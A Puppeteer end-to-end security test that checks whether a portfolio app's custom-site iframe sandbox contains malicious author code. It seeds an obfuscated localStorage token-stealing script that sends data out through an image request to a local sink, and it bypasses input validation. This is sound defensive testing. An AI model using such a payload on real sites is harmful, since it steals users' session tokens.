// End-to-end containment proof for the custom-site sandbox.
//
// It seeds a hostile, VALIDATION-BYPASSING custom site directly into the database
// (so the regex/sanitizer gates are deliberately skipped), then loads the public
// portfolio in a real browser with a victim auth token planted in the app origin's
// localStorage. It proves the runtime sandbox — not the input filters — is what
// contains a bypass: the framed author code runs on a different origin, so it can
// neither read the app-origin token nor exfiltrate it.
//
// Prerequisites (same shape as `npm run test:security-smoke`): a running API +
// frontend + Postgres, with CUSTOM_SITE_SANDBOX_ORIGIN / VITE_CUSTOM_SITE_ORIGIN
// configured so the iframe loads from a distinct origin.
//
//   SECURITY_API_URL, SECURITY_FRONTEND_URL override the defaults below.

const puppeteer = require('puppeteer');
const http = require('http');
const { pool } = require('../config/database');

const apiBase = process.env.SECURITY_API_URL || 'http://localhost:5000/api';
const frontendBase = process.env.SECURITY_FRONTEND_URL || 'http://127.0.0.1:3000';
const suffix = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
const createdUserIds = [];

const request = async (path, { token, method = 'GET', body } = {}) => {
  const response = await fetch(`${apiBase}${path}`, {
    method,
    headers: {
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...(body ? { 'Content-Type': 'application/json' } : {}),
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await response.text();
  let data;
  try { data = text ? JSON.parse(text) : null; } catch { data = text; }
  return { status: response.status, data };
};

const register = async (label) => {
  const result = await request('/auth/register', {
    method: 'POST',
    body: {
      email: `sandbox-${label}-${suffix}@example.test`,
      password: 'AuditOnly!Password123',
      full_name: `Sandbox ${label}`,
      username: `sandbox-${label}-${suffix}`,
    },
  });
  if (result.status !== 201) throw new Error(`Register ${label} failed: ${result.status} ${JSON.stringify(result.data)}`);
  createdUserIds.push(result.data.user.id);
  return result.data;
};

const run = async () => {
  let browser;
  const evidence = {};
  // Local sink that a successful exfil would hit. Any request here proves failure.
  let exfilRequests = 0;
  let exfilCarriedToken = false;
  const sink = http.createServer((req, res) => {
    exfilRequests += 1;
    if (/[?&]t=.+/.test(req.url || '') && !/[?&]t=(&|$)/.test(req.url || '')) exfilCarriedToken = true;
    res.writeHead(204);
    res.end();
  });
  await new Promise((resolve, reject) => {
    sink.once('error', reject);
    sink.listen(0, '127.0.0.1', resolve);
  });
  const sinkPort = sink.address().port;

  try {
    const attacker = await register('attacker');
    const victim = await register('victim');

    // Obfuscated token theft + image-GET exfil that defeats the regex deny-list.
    const hostileJs = [
      "var s = window['loc' + 'alStorage'];",
      "var t = s ? s['getIt' + 'em']('token') : '';",
      `new Image().src = 'http://127.0.0.1:${sinkPort}/x?t=' + encodeURIComponent(t || 'EMPTY');`,
    ].join('\n');

    // Seed directly, bypassing validateCustomSiteCode / normalizeForStorage.
    await pool.query(
      `UPDATE portfolio_settings
          SET custom_site_enabled = true,
              is_public = true,
              custom_site_html = $2,
              custom_site_css = $3,
              custom_site_js = $4,
              custom_site_updated_at = now()
        WHERE user_id = $1`,
      [attacker.user.id, '<main><h1>hi</h1></main>', 'body{margin:0}', hostileJs],
    );

    // Confirm the served document names the app origin in frame-ancestors.
    const docResponse = await fetch(`${apiBase.replace(/\/api$/, '')}/api/portfolio/${attacker.user.username}/custom-site`, {
      redirect: 'manual',
    });
    evidence.served_doc = {
      status: docResponse.status,
      location: docResponse.headers.get('location'),
      csp: docResponse.headers.get('content-security-policy'),
    };

    browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'] });
    const page = await browser.newPage();
    await page.goto(`${frontendBase}/login`, { waitUntil: 'networkidle0' });
    // Plant the victim's token in the APP origin's localStorage.
    await page.evaluate(({ token, user }) => {
      localStorage.setItem('token', token);
      localStorage.setItem('user', JSON.stringify(user));
    }, { token: victim.token, user: victim.user });

    await page.goto(`${frontendBase}/${attacker.user.username}`, { waitUntil: 'networkidle0' });
    // Give the framed hostile script time to run and attempt exfil.
    await new Promise((resolve) => setTimeout(resolve, 1500));

    // Inspect the custom-site iframe's own origin: its localStorage must not carry
    // the app-origin token (distinct origin), and it must not see the parent.
    const customFrame = page.frames().find((frame) => /\/custom-site/.test(frame.url()));
    let frameTokenReadable = null;
    if (customFrame) {
      frameTokenReadable = await customFrame.evaluate(() => {
        try { return window.localStorage.getItem('token'); } catch { return 'THREW'; }
      }).catch(() => 'THREW');
    }
    evidence.iframe_isolation = {
      frame_found: Boolean(customFrame),
      frame_url: customFrame?.url() || null,
      frame_token_value: frameTokenReadable,
    };

    evidence.exfiltration = {
      sink_requests: exfilRequests,
      carried_token: exfilCarriedToken,
    };

    const failures = [];
    if (exfilCarriedToken) failures.push('sandbox exfiltrated the app-origin token');
    if (frameTokenReadable && frameTokenReadable !== 'THREW') failures.push('iframe could read an app-origin token');
    if (evidence.served_doc.csp && !/frame-ancestors\s+http/i.test(evidence.served_doc.csp)) {
      failures.push('served doc CSP does not name the app origin in frame-ancestors');
    }

    if (failures.length) {
      process.stdout.write(`${JSON.stringify({ ...evidence, failures }, null, 2)}\n`);
      throw new Error(`Custom-site sandbox smoke failed: ${failures.join('; ')}`);
    }
    process.stdout.write(`${JSON.stringify(evidence, null, 2)}\n`);
  } finally {
    await browser?.close().catch(() => {});
    await new Promise((resolve) => sink.close(resolve));
    if (createdUserIds.length) {
      await pool.query('DELETE FROM users WHERE id = ANY($1::uuid[])', [createdUserIds]).catch(() => {});
    }
    await pool.end();
  }
};

run().catch((error) => {
  console.error(error.stack || error.message);
  process.exitCode = 1;
});
